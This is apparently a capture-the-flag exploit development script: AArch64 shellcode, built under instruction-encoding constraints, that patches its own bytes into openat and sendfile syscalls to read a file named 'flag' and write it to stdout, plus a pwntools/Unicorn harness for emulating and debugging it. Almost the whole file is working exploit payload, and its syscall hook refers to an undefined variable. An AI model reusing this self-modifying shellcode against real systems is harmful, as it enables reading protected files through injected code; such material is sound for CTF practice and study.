#!/usr/bin/env python
import sys
#sys.path = ['./site_pack']+sys.path
from pwn import *
import os
import struct
import types
from unicorn import *
from unicorn.arm64_const import *

def hook_syscall(uc, user_data):
    arg_regs = [UC_ARM64_REG_X0, UC_ARM64_REG_X1, UC_ARM64_REG_X2, UC_ARM64_REG_X3, UC_ARM64_REG_X4, UC_ARM64_REG_X5]
    rax = uc.reg_read(UC_ARM64_REG_X8)
    print('syscall',rax)
    uc.reg_write(UC_ARM64_REG_X8, ret)
    return

context.arch = 'aarch64'

CODE = 0x40009c5000
STACK = 0x4000812000

s = '''
.inst 0x3220307d /* orr w29, w11, #0x3fff */

/* prepare */
adds w11, w26, #2271
subs w11, w11, #2056 /* w11 = 0b00_0011_0101_11 = 215 */
adds w11, w11, #2073 /* w11 = 0b10_0011_1100_00 = 2288 */
adds w17, w26, #2460
adds w18, w26, #2508

/* prepare x1 = "flag" */
subs w25, w11, #2131 /* w25 = 0x9d */
adds w10, w26, #3036 /* w10 = 3036 */
subs w9, w10, #2064 /* w9 = 0x03cc */
strh w9, [x1, x25]
subs w25, w11, #2129 /* w25 = 0x9f */
subs w9, w18, #2331 /* w9 = 0xb1 */
strb w9, [x1, x25]

/* prepare x0 = -100 */
subs w25, w11, #2128 /* w25 = 0xa0 */
subs w9, w17, #2332 /* w9 = 0x80 */
strb w9, [x1, x25]
subs w25, w11, #2127 /* w25 = 0xa1 */
subs w9, w10, #2640 /* w9 = 0x018c */
strh w9, [x1, x25]
subs w25, w11, #2125 /* w25 = 0xa3 */
subs w9, w18, #2267 /* w9 = 0xf1 */
strb w9, [x1, x25]

cbnz w26, 0x40404

.inst 0x3220307d /* orr w29, w11, #0x3fff */
.inst 0x3220307d /* orr w29, w11, #0x3fff */

/* prepare svc # store 0x00 to 0xa6 and 0xba */
subs w25, w11, #2122 /* w25 = 0xa6 */
strb w26, [x1, x25]
subs w25, w18, #2322 /* w25 = 0xba */
strb w26, [x1, x25]

/* store "\x00" to 0xf7 to end the string "flag" */
subs w25, w18, #2261 /* w25 = 0xf7 */
strb w26, [x1, x25]

/* prepare svc # store 0xd4 to 0xa7 and 0xbb */
subs w9, w17, #2248 /* w9 = 0xd4 */
subs w25, w11, #2121 /* w25 = 0xa7 */
strb w9, [x1, x25]
subs w25, w18, #2321 /* w25 = 0xbb */
strb w9, [x1, x25]

/* openat(-100, data_offset, 0, 0) */
subs w2, w17, #2460 /* w2 = 0x0 */
subs w3, w17, #2460 /* w3 = 0x0 */
subs w8, w18, #2452 /* w8 = 0x38 */
.inst 0x41414121 /* (b103cc21) adds x1, x1, #0xf3 */ /* x1 = "flag" */
.inst 0x41414141 /* (f1018c80) subs x0, x4, #0x63 */ /* x0 = -100 */
.inst 0x41413021 /* svc #257 */

/* sendfile(1, 3, 0, 0xf7) */
subs w0, w17, #2459 /* w0 = 0x1 */
subs w1, w17, #2457 /* w1 = 0x3 */
subs w3, w18, #2261 /* w3 = 0xf7 */
subs w8, w17, #2389 /* w8 = 0x47 */
.inst 0x41413021 /* svc #257 */

.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x41414141
.inst 0x66414141
.inst 0x4167616c
'''
main = asm(s)

def setregs(uc):
    uc.reg_write(UC_ARM64_REG_X0,0x40009c5000)
    uc.reg_write(UC_ARM64_REG_X1,0x40009c5000)
    uc.reg_write(UC_ARM64_REG_X2,0x1000)
    uc.reg_write(UC_ARM64_REG_X3,0x40009c3500)
    uc.reg_write(UC_ARM64_REG_X4,0xffffffffffffffff)
    uc.reg_write(UC_ARM64_REG_X5,0)
    uc.reg_write(UC_ARM64_REG_X6,0x40009bf608)
    uc.reg_write(UC_ARM64_REG_X7,0x40000000000)
    uc.reg_write(UC_ARM64_REG_X8,0x3f)
    uc.reg_write(UC_ARM64_REG_X9,0x3f)
    uc.reg_write(UC_ARM64_REG_X10,0x80000020)
    uc.reg_write(UC_ARM64_REG_X12,0x4000857208)
    uc.reg_write(UC_ARM64_REG_X13,0)
    uc.reg_write(UC_ARM64_REG_X14,0)
    uc.reg_write(UC_ARM64_REG_X15,0x6fffff47)
    uc.reg_write(UC_ARM64_REG_X16,0x4000010fb0)
    uc.reg_write(UC_ARM64_REG_X17,0x4000916dd0)
    uc.reg_write(UC_ARM64_REG_X18,0x73516240)
    uc.reg_write(UC_ARM64_REG_X19,0x4000000840)
    uc.reg_write(UC_ARM64_REG_X20,0)
    uc.reg_write(UC_ARM64_REG_X21,0x40000006c0)
    uc.reg_write(UC_ARM64_REG_X22,0)
    uc.reg_write(UC_ARM64_REG_X23,0)
    uc.reg_write(UC_ARM64_REG_X24,0)
    uc.reg_write(UC_ARM64_REG_X25,0)
    uc.reg_write(UC_ARM64_REG_X26,0)
    uc.reg_write(UC_ARM64_REG_X27,0)
    uc.reg_write(UC_ARM64_REG_X28,0)
    uc.reg_write(UC_ARM64_REG_X29,0x40008124a0)
    uc.reg_write(UC_ARM64_REG_SP,0x40008124a0)


def debug_hook(uc, address, size, user_data):
    pc = uc.reg_read(UC_ARM64_REG_PC)
    print('pc : ',hex(pc))
    print('x0 : ',hex(uc.reg_read(UC_ARM64_REG_X0)))
    print('x1 : ',hex(uc.reg_read(UC_ARM64_REG_X1)))
    print('x2 : ',hex(uc.reg_read(UC_ARM64_REG_X2)))
    print('x3 : ',hex(uc.reg_read(UC_ARM64_REG_X3)))
    print('x8 : ',hex(uc.reg_read(UC_ARM64_REG_X8)))
    print(disasm(uc.mem_read(pc,0x10)))
    input('debug>>')




def init(uc):
    uc.mem_map(CODE, 0x1000, UC_PROT_READ | UC_PROT_WRITE | UC_PROT_EXEC)
    uc.mem_write(CODE, main)
    uc.mem_map(STACK, 0x1000, UC_PROT_READ | UC_PROT_WRITE)
    uc.mem_write(STACK, b'hello\n')

    setregs(uc)
    uc.hook_add(UC_HOOK_INSN, hook_syscall, None, 1, 0, UC_HOOK_INTR)
    uc.hook_add(UC_HOOK_CODE, debug_hook, None, CODE+0x9c, CODE+0x9c)


def play():
    uc = Uc(UC_ARCH_ARM64, UC_MODE_ARM)
    init(uc)
    try:
        uc.emu_start(CODE, CODE + 0x1000 - 1)
    except UcError as e:
        print("error...")
        print(e)
        pc = uc.reg_read(UC_ARM64_REG_PC)
        print('pc : ',hex(pc))
        print('x0 : ',hex(uc.reg_read(UC_ARM64_REG_X0)))
        print('x1 : ',hex(uc.reg_read(UC_ARM64_REG_X1)))
        print('x2 : ',hex(uc.reg_read(UC_ARM64_REG_X2)))
        print('x3 : ',hex(uc.reg_read(UC_ARM64_REG_X3)))
        print('x8 : ',hex(uc.reg_read(UC_ARM64_REG_X8)))
        print(disasm(uc.mem_read(pc,0x10)))

if __name__ == '__main__':
    play()
